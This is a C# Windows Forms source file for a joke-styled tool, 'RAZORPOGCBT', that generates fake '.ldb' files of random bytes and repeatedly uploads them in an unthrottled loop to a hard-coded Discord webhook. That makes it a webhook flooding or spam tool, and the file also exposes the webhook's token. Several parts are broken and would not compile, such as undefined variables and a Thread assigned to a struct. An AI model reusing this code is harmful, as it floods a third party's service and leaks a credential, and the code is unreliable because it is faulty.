using System;
using System.Media;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace RAZORPOGCBT
{
    public partial class Form1 : Form
    {

        struct Attak
        {

            
            public Attak(string a, string shitpath) : this()
            {
                this.filename = a;
                this.fullpath = shitpath;
            }

            public string filename { get; }
            public string fullpath { get; }
        }

        bool pop = false;
        SoundPlayer pogsound = new SoundPlayer(Properties.Resources.intro);
        SoundPlayer poggersound = new SoundPlayer(Properties.Resources.POGGERS);
        Attak Attack()
        {

            Random r = new Random();

            //bool kek = true;

            /* button2.Click += (sender, args) =>
             * 
             {
                 kek = false;
             };*/
            string path = Application.StartupPath;

            string appenis()
            {
                string outt;

                int num = r.Next(1, 7989);
                if (num < 10)
                {
                    outt = "000" + num.ToString();
                }
                else if (num < 100 && num >= 10)
                {
                    outt = "00" + num.ToString();
                }
                else if (num >= 100 && num < 1000)
                {
                    outt = "0" + num.ToString();
                }
                else
                {
                    outt = num.ToString();
                }

                return outt;
            }
            string a = "00" + appenis() + ".ldb";
            string shitpath = System.IO.Path.Combine(path, a);

            if (!System.IO.File.Exists(shitpath))
            {
                using (System.IO.FileStream fs = System.IO.File.Create(shitpath))
                {
                    int poggers = r.Next(20000, 120000);
                    Byte[] cock = new Byte[poggers];

                    r.NextBytes(cock);

                    string hexValues = "8F 72 F0 4F 00 2C 0C 4D 45 54 41 3A 68 74 74 70";
                    string[] hexValuesSplit = hexValues.Split(' ');
                    for (int i = 0; i < hexValuesSplit.Length; i++)
                    {
                        string hex = hexValuesSplit[i];
                        // Convert the number expressed in base-16 to an integer.
                        int value = Convert.ToInt32(hex, 16);
                        char charValue = (char)value;

                        cock[i] = (byte)charValue;
                    }


                    for (int i = 0; i < poggers; i++)
                    {
                        fs.WriteByte(cock[i]);
                    }
                    
                }
            }
            //Thread.CurrentThread.Join();
            return new Attak(a, shitpath);
        }
        public Form1()
        {
            InitializeComponent();
            
            //SoundPlayer pogsound = new SoundPlayer(System.IO.Path.Combine(Application.StartupPath, "intro.wav"));
            poggersound.Load();
            pogsound.Load();
            pogsound.PlayLooping();
            
            //Thread t = new Thread(new ThreadStart(Attack));
            button2.Click += (sender, args) =>
            {
                if (!pop)
                {
                    pop = true;
                    pogsound.Stop();
                    poggersound.PlayLooping();
                    pictureBox1.Visible = true;
                    pictureBox2.Visible = true;
                    pictureBox3.Visible = true;
                    pictureBox4.Visible = true;
                    button2.Text = "YOOOOOOO";
                    textBox1.Text = "";

                    System.Threading.Thread.Sleep(200);

                    //Attack();
                    /*pogsound.SoundLocation = "POGGERS.wav";
                    pogsound.Load();
                    pogsound.LoadCompleted += (senator, sex) =>
                    {
                        pogsound.PlayLooping();
                    };*/

                    //t.Start();
                    //pop = false;
                } else
                {
                    pop = false;
                    button2.Text = "ENGAGE CBT";
                    pictureBox1.Visible = false;
                    pictureBox2.Visible = false;
                    pictureBox3.Visible = false;
                    pictureBox4.Visible = false;
                    poggersound.Stop();
                    pogsound.PlayLooping();
                    //t.Join();
                }
            };

            
            //pogsound.PlayLooping();
            
           

                  

        }


        private void Uppdate()
        {
            while (true)
            {
                if (pop)
                {
                    Thread t = new Thread(new ThreadStart(Attack));
                    Attak A = new Thread(new ThreadStart(Attack));
                    textBox1.Text += "\r\n\r\nSending shit " + a + " to the pepega...";
                    using (WebClient webClient = new WebClient())
                    {
                        try
                        {
                            //System.Console.Beep();
                            webClient.UploadFile("https://discord.com/api/webhooks/790984946054856715/tSevEHZxLv_HJoDhQWj-jS0tpH4mrD-vjbM5fS459pxJkEXaAg8TRERsrYfSyuVdnz_S", shitpath);
                        }
                        catch (Exception e)
                        {
                            textBox1.Text += "\n\r\n\rI SHIT MAHSELF: " + e.Message;
                            if (System.IO.File.Exists(shitpath))
                            {
                                System.IO.File.Delete(shitpath);
                            }
                            poggersound.Stop();
                            new SoundPlayer(Properties.Resources.Wetfart).Play();
                            //kek = false;
                        }
                    }
                    textBox1.Text += "\r\n\r\nDone!";
                    if (!System.IO.File.Exists(shitpath))
                    {
                        System.IO.File.Delete(shitpath);
                    }
                }
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Thread t = new Thread(new ThreadStart(Uppdate));
            t.Start();
            Form1.ActiveForm.Disposed += (_, __) =>
            {
                t.Join();
            };
        }

        
    }

}
